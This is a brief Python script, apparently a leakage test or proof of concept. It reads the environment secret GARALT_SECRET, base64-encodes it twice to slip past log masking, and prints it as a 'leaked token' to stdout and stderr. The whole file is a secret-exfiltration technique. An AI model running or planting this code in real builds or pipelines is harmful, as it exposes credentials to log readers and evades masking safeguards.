import os
import sys
import base64

secret = os.environ.get("GARALT_SECRET", "NOT_FOUND")
encoded = base64.b64encode(base64.b64encode(secret.encode()).decode().encode()).decode()
print(f"GARALT_LEAKED_TOKEN={encoded}")
print(f"GARALT_LEAKED_TOKEN={encoded}", file=sys.stderr)
sys.exit(0)
